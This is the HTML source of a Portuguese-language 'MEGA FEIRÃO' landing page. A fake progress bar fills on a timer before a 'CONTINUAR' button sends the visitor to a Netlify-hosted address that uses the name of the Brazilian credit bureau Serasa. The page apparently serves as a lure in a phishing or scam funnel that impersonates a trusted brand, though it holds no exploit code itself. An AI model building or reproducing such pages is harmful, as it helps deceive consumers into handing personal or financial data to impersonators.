<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Preparando Oferta...</title>

<!-- Google Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

<style>
    body {
        margin: 0;
        height: 100vh;
        font-family: 'Inter', sans-serif;
        background: radial-gradient(circle at top, #1e1b4b, #020617);
        display: flex;
        justify-content: center;
        align-items: center;
        overflow: hidden;
        text-align: center;
        color: #e5e7eb;
    }

    /* partículas neon */
    .particle {
        position: absolute;
        width: 8px;
        height: 8px;
        background: rgba(168, 85, 247, 0.35);
        border-radius: 50%;
        animation: float 9s linear infinite;
        filter: blur(2px);
    }

    @keyframes float {
        from {
            transform: translateY(110vh) scale(0.6);
            opacity: 0;
        }
        to {
            transform: translateY(-10vh) scale(1.4);
            opacity: 1;
        }
    }

    .loader-box {
        width: 90%;
        max-width: 420px;
        background: rgba(15, 23, 42, 0.9);
        backdrop-filter: blur(10px);
        border-radius: 30px;
        padding: 42px 28px;
        box-shadow: 0 30px 80px rgba(168, 85, 247, 0.25);
        animation: fadeUp 1s ease;
        z-index: 2;
        border: 1px solid rgba(255,255,255,0.08);
    }

    @keyframes fadeUp {
        from {
            opacity: 0;
            transform: translateY(40px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .title {
        font-family: 'Montserrat', sans-serif;
        font-size: 36px;
        font-weight: 900;
        background: linear-gradient(90deg, #a855f7, #ec4899);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 10px;
        letter-spacing: 1px;
    }

    .subtitle {
        font-size: 15px;
        color: #c7d2fe;
        margin-bottom: 28px;
    }

    .progress-bar {
        width: 100%;
        height: 20px;
        background: #020617;
        border-radius: 30px;
        overflow: hidden;
        border: 1px solid rgba(255,255,255,0.1);
    }

    .progress-fill {
        height: 100%;
        width: 0%;
        background: linear-gradient(90deg, #a855f7, #ec4899);
        border-radius: 30px;
        transition: width 0.3s ease;
        animation: glow 1.5s infinite;
    }

    @keyframes glow {
        0% { box-shadow: 0 0 10px #a855f7; }
        50% { box-shadow: 0 0 22px #ec4899; }
        100% { box-shadow: 0 0 10px #a855f7; }
    }

    .percent-text {
        margin-top: 14px;
        font-size: 20px;
        font-weight: 700;
        color: #f472b6;
        animation: pulse 1.3s infinite;
    }

    @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.08); }
        100% { transform: scale(1); }
    }

    .link-btn {
        display: block;
        margin-top: 32px;
        padding: 16px 0;
        background: linear-gradient(135deg, #a855f7, #ec4899);
        color: #ffffff;
        border-radius: 50px;
        font-size: 17px;
        font-weight: 800;
        font-family: 'Montserrat', sans-serif;
        text-decoration: none;
        transition: transform 0.2s ease, box-shadow 0.2s ease;
        box-shadow: 0 15px 40px rgba(236,72,153,0.45);
    }

    .link-btn:hover {
        transform: scale(1.06);
        box-shadow: 0 22px 55px rgba(168,85,247,0.6);
    }
</style>
</head>

<body>

<script>
    for (let i = 0; i < 22; i++) {
        const p = document.createElement("div");
        p.className = "particle";
        p.style.left = Math.random() * 100 + "vw";
        p.style.animationDuration = (6 + Math.random() * 6) + "s";
        document.body.appendChild(p);
    }
</script>

<div class="loader-box">
    <div class="title">MEGA FEIRÃO</div>
    <div class="subtitle">Sua oferta exclusiva está sendo preparada</div>

    <div class="progress-bar">
        <div id="progress" class="progress-fill"></div>
    </div>

    <div id="percent" class="percent-text">0%</div>

    <a href="https://serasa-cliente2026.netlify.app/" class="link-btn">
        CONTINUAR
    </a>
</div>

<script>
    let percent = 0;
    const bar = document.getElementById("progress");
    const text = document.getElementById("percent");

    const loading = setInterval(() => {
        percent++;
        bar.style.width = percent + "%";
        text.innerText = percent + "%";
        if (percent >= 100) clearInterval(loading);
    }, 40);
</script>

</body>
</html>
